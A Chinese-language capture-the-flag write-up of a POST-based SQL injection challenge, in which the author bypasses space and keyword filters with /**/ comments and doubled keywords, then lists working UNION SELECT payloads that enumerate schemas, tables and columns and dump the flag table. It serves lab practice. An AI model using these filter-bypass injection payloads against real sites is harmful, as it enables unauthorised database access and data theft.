---
date: 2026-09-27 16:11
author: 冰冰洁
tags:
  - "#web"
  - "#sql注入"
---
# 题目分析

首先进入题目观察到这是一个sql注入类型的题目。且 题目类型中已经说了是post型的注入，且存在绕过

因此直接打开hackbar开始寻找回显：

![[Pasted image 20260927161413.png]]

但是注意到这个报错：我明明输入的是`order by`但其显示的是`derby1`

猜测这个题目对空格进行了处理。因此使用`/**/`来绕过空格：
![[Pasted image 20260927162018.png]]

依旧报错，这次的错误是之后`der`

因此 猜测后端有对`order`中的`or`的过滤：

![[Pasted image 20260927162405.png]]

依旧报错，因此猜测`--+`要改成`#`

测试后得到列数为三，payload如下：

```
nss=-1'/**/oorrder/**/by/**/3#  #正常回显
nss=-1'/**/oorrder/**/by/**/4#  #报错
```

直接猜测后端对`union`也有过滤，开始判断显示位：

```
nss=-1'/**/ununionion/**/select/**/1,2,3#
```

显示不变，尝试第二行

```
nss=-1'/**/ununionion/**/select/**/1,2,3/**/limit/**/1,1#
```

![[Pasted image 20260927162903.png]]

发生变化。

于是开始逐步查询数据库、数据表以及对应的属性：

```
nss=-1'/**/ununionion/**/select/**/1,database(),(select/**/group_concat(schema_name)/**/from/**/infoorrmation_schema.schemata)/**/limit/**/1,1#

nss=-1'/**/ununionion/**/select/**/1,database(),group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1#

nss=-1'/**/ununionion/**/select/**/1,database(),group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb'/**/limit/**/1,1#

nss=-1'/**/ununionion/**/select/**/1,database(),group_concat(id,Secr3t,flll444g)/**/from/**/NSS_tb/**/limit/**/1,1#
```

![[Pasted image 20260927163458.png]]

得到flag
